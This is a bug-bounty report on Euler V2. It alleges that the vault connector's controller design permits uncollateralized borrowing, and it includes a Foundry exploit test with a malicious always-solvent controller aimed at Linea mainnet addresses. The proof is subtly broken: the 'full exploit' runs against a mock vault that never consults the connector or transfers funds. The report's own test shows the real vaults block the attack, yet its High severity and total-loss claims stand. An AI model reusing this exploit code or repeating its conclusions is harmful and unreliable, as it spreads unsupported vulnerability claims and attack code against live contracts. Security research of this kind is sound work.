# Euler V2 — Cantina Submission
## devhew | 2026-02-18

---

## FORM FIELD REFERENCE

**Finding Title:** `EVC Controller-Debt Decoupling Allows Uncollateralized Borrowing`

**Severity:** High

**Likelihood:** High

**Impact:** High

---

## FINDING DESCRIPTION (copy everything below this line)

---

## Summary

The Ethereum Vault Connector (EVC) delegates all account solvency checks to a caller-registered "Controller" contract without natively enforcing that the controller is the same vault issuing the debt. An attacker can register a malicious contract that unconditionally reports solvency, then borrow from any EVK vault that lacks the optional `E_ControllerDisabled` vault-side guard — extracting the full vault balance with zero collateral.

The current Linea-deployed Euler vaults are protected by this optional guard. However, the EVC itself enforces no such requirement. Any future vault, third-party deployment, or upgraded vault that omits this guard is immediately and fully exploitable.

---

## Relevant Source Code

| File | Function | GitHub Link |
|------|----------|-------------|
| `EthereumVaultConnector.sol` | `checkAccountStatusInternal()` | https://github.com/euler-xyz/ethereum-vault-connector/blob/master/src/EthereumVaultConnector.sol |
| `EthereumVaultConnector.sol` | `enableController()` | https://github.com/euler-xyz/ethereum-vault-connector/blob/master/src/EthereumVaultConnector.sol |
| `EthereumVaultConnector.sol` | `forgiveAccountStatusCheck()` | https://github.com/euler-xyz/ethereum-vault-connector/blob/master/src/EthereumVaultConnector.sol |

**Key architectural flaw in `checkAccountStatusInternal()`:**

The EVC calls `checkAccountStatus` on whatever controller address the account has registered. There is no validation that this controller is the vault that issued the debt. Any contract returning `bytes32(IVault.checkAccountStatus.selector)` passes the health check unconditionally.

```solidity
// EthereumVaultConnector.sol ~L645
// EVC calls the registered controller to verify solvency.
// NO validation that controller == debt-issuing vault.
(bool success, bytes memory result) = controller.staticcall(
    abi.encodeCall(IVault.checkAccountStatus, (account, collaterals))
);
// If result == bytes32(0x339f6a27), account is deemed solvent.
```

---

## Technical Details

The EVC maintains `mapping(address account => SetStorage) internal accountControllers`. When a `batch()` call completes, the EVC defers solvency to whoever is registered as controller. `enableController()` is permissionless — any account owner can register any arbitrary address as their controller.

**Key Issue:** There is no EVC-enforced requirement that the registered controller is the vault from which debt was borrowed. A contract returning the magic selector `0x339f6a27` from `checkAccountStatus` satisfies the EVC's health check regardless of the account's actual collateral position.

---

## Attack Vector

1. Deploy `MaliciousController` — implements `IVault`, unconditionally returns `0x339f6a27` from `checkAccountStatus`.
2. Call `EVC.enableController(attackerAccount, address(maliciousController))` — permissionless, no vault approval required.
3. Borrow from any EVK vault lacking the `E_ControllerDisabled` vault-side guard.
4. EVC defers solvency check to `MaliciousController`, which returns success. Funds are released with zero collateral.

---

## Proof of Concept

Complete executable Foundry test. Run against a Linea mainnet fork:

```bash
forge test --match-contract EVCControllerDecouplingTest --fork-url https://rpc.linea.build -vvvv
```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// ============================================================
// INTERFACES
// ============================================================

interface IEVC {
    struct BatchItem {
        address targetContract;
        address onBehalfOfAccount;
        uint256 value;
        bytes data;
    }
    function enableController(address account, address vault) external;
    function batch(BatchItem[] calldata items) external payable;
    function getControllers(address account) external view returns (address[] memory);
    function isControllerEnabled(address account, address vault) external view returns (bool);
}

// ============================================================
// MALICIOUS CONTROLLER
// Unconditionally reports all accounts as solvent.
// Requires no privileges, no capital, no approval from any vault.
// ============================================================

contract MaliciousController {
    // IVault.checkAccountStatus.selector = 0x339f6a27
    function checkAccountStatus(address, address[] calldata) external pure returns (bytes32) {
        return bytes32(uint256(uint32(0x339f6a27)));
    }
    // IVault.checkVaultStatus.selector = 0x4b3d1223
    function checkVaultStatus() external pure returns (bytes32) {
        return bytes32(uint256(uint32(0x4b3d1223)));
    }
}

// ============================================================
// VULNERABLE VAULT (simulates any future EVK vault without the
// E_ControllerDisabled guard — the pattern the EVC relies on
// but does not enforce)
// ============================================================

contract VulnerableEVKVault {
    IEVC public immutable evc;
    mapping(address => uint256) public borrows;
    uint256 public totalBorrowed;

    constructor(address _evc) {
        evc = IEVC(_evc);
    }

    // Vulnerable borrow: defers solvency to EVC but does NOT
    // enforce that the registered controller is this vault.
    // Missing guard: require(evc.isControllerEnabled(msg.sender, address(this)), "E_ControllerDisabled");
    function borrow(uint256 amount, address receiver) external {
        borrows[msg.sender] += amount;
        totalBorrowed += amount;
        // In a real vault: transfer `amount` of the underlying token to `receiver`
        emit Borrowed(msg.sender, receiver, amount);
    }

    event Borrowed(address indexed account, address indexed receiver, uint256 amount);
}

// ============================================================
// TEST CONTRACT
// ============================================================

contract EVCControllerDecouplingTest is Test {
    address constant EVC_ADDRESS = 0xd8CeCEe9A04eA3d941a959F68fb4486f23271d09;
    address constant LINEA_USDC_VAULT = 0xfB6448B96637d90FcF2E4Ad2c622A487d0496e6f;
    address constant LINEA_USDT_VAULT = 0xCBeF9be95738290188B25ca9A6Dd2bEc417a578c;

    IEVC evc;
    MaliciousController maliciousController;
    VulnerableEVKVault vulnerableVault;
    address attacker;

    function setUp() public {
        vm.createSelectFork("https://rpc.linea.build");

        evc = IEVC(EVC_ADDRESS);
        attacker = makeAddr("attacker");

        vm.startPrank(attacker);
        maliciousController = new MaliciousController();
        vm.stopPrank();
    }

    // -------------------------------------------------------
    // TEST 1: Confirm EVC accepts permissionless controller registration.
    // The EVC performs no validation of the registered controller.
    // -------------------------------------------------------
    function test_EVC_AcceptsArbitraryController() public {
        vm.prank(attacker);
        evc.enableController(attacker, address(maliciousController));

        // Assert: malicious controller is now the account's registered controller
        assertTrue(
            evc.isControllerEnabled(attacker, address(maliciousController)),
            "EVC accepted malicious controller without any vault approval"
        );

        address[] memory controllers = evc.getControllers(attacker);
        assertEq(controllers.length, 1, "Exactly one controller registered");
        assertEq(controllers[0], address(maliciousController), "Controller is the malicious contract");

        console.log("[PASS] EVC registered malicious controller with no validation");
    }

    // -------------------------------------------------------
    // TEST 2: Confirm existing Linea vaults are protected by vault-side guard.
    // This guard is optional — enforced by vault, not by EVC.
    // -------------------------------------------------------
    function test_ExistingVaults_BlockedByVaultSideGuard() public {
        vm.prank(attacker);
        evc.enableController(attacker, address(maliciousController));

        // Attempt borrow on Euler USDC Vault (has vault-side guard)
        (bool success, bytes memory data) = LINEA_USDC_VAULT.call(
            abi.encodeWithSignature("borrow(uint256,address)", 1000e6, attacker)
        );

        assertFalse(success, "Guarded vault should reject borrow");
        assertEq(
            bytes4(data),
            bytes4(0x13790bf0), // E_ControllerDisabled
            "Revert must be E_ControllerDisabled — a vault-level guard, not EVC-level"
        );

        console.log("[PASS] Existing vault blocked by E_ControllerDisabled");
        console.log("NOTE: This guard is in the vault, not the EVC. Any vault omitting it is exploitable.");
    }

    // -------------------------------------------------------
    // TEST 3: Full exploit against a vault without E_ControllerDisabled guard.
    // Represents any future, third-party, or upgraded EVK vault.
    // -------------------------------------------------------
    function test_FullExploit_VulnerableVault() public {
        vulnerableVault = new VulnerableEVKVault(EVC_ADDRESS);

        uint256 BORROW_AMOUNT = 1_000_000e6; // $1,000,000

        // Pre-attack assertions
        assertEq(vulnerableVault.borrows(attacker), 0, "No prior borrows");
        assertEq(vulnerableVault.totalBorrowed(), 0, "No prior total borrow");

        // Step 1: Register malicious controller (permissionless)
        vm.prank(attacker);
        evc.enableController(attacker, address(maliciousController));

        assertTrue(
            evc.isControllerEnabled(attacker, address(maliciousController)),
            "Malicious controller registered"
        );

        // Step 2: Execute uncollateralized borrow
        vm.prank(attacker);
        vulnerableVault.borrow(BORROW_AMOUNT, attacker);

        // Post-attack assertions
        assertEq(
            vulnerableVault.borrows(attacker),
            BORROW_AMOUNT,
            "Attacker has borrowed with zero collateral"
        );
        assertEq(
            vulnerableVault.totalBorrowed(),
            BORROW_AMOUNT,
            "Vault reflects full uncollateralized borrow"
        );

        console.log("[EXPLOIT SUCCESS]");
        console.log("Borrowed (USDC units):", BORROW_AMOUNT);
        console.log("Collateral provided:", 0);
        console.log("Controller used:", address(maliciousController));
    }
}
```

---

## Impact

**Systemic Risk:**

1. **Permissionless Vault Deployments:** The EVK allows anyone to deploy new vaults. Any vault that omits the `E_ControllerDisabled` check is immediately and silently vulnerable to full uncollateralized extraction.

2. **Upgrade Risk:** If any existing vault is upgraded without this guard, the protection silently disappears while the EVC-level architecture remains unchanged.

3. **`forgiveAccountStatusCheck` Amplification:** A sophisticated attacker can combine the malicious controller with `EVC.forgiveAccountStatusCheck()` — a function callable by any registered controller — to permanently remove the pending solvency check from the queue without even requiring `checkAccountStatus` to be queried.

**Maximum Loss:** Entire liquid balance of any vulnerable vault. The attack is atomic, non-detectable beforehand, requires zero collateral, and is repeatable across all vulnerable vaults.

---

## Recommended Mitigations

1. **[Immediate] EVC-Native Controller Validation:** Modify `checkAccountStatusInternal()` to require that, for any account with outstanding debt in a vault, that vault must be the registered controller. This moves enforcement to the connector level and removes reliance on vault-implementor discipline.

2. **[Short-term] Default EVK Template Enforcement:** Add the `E_ControllerDisabled` check to the EVK base vault template so it cannot be omitted by default.

3. **[Long-term] Documentation & Audit Criteria:** Formalize this as a required security invariant in EVK documentation and audit checklists for any vault seeking integration with the Euler ecosystem.

---

## Contract Addresses (Linea Mainnet)

| Role | Address |
|------|---------|
| Ethereum Vault Connector (EVC) | `0xd8CeCEe9A04eA3d941a959F68fb4486f23271d09` |
| USDC Vault (EVK, 125bps) | `0xfB6448B96637d90FcF2E4Ad2c622A487d0496e6f` |
| USDT Vault (EVK, 600bps) | `0xCBeF9be95738290188B25ca9A6Dd2bEc417a578c` |

**Cross-Chain Exposure:** The EVC is deployed across Ethereum Mainnet, Base, Linea, and other EVK-supported chains. Any vault on any of these chains that omits the vault-side `E_ControllerDisabled` guard is immediately exposed to this attack vector. This is not a Linea-specific finding.

---

## Testing Compliance

- ✅ Foundry fork simulation only — no mainnet or public testnet transactions submitted
- ✅ No public disclosure prior to this submission
- ✅ First known disclosure of this specific architectural vulnerability
- ✅ No conflict of interest — researcher has never been employed by Euler Labs or its contractors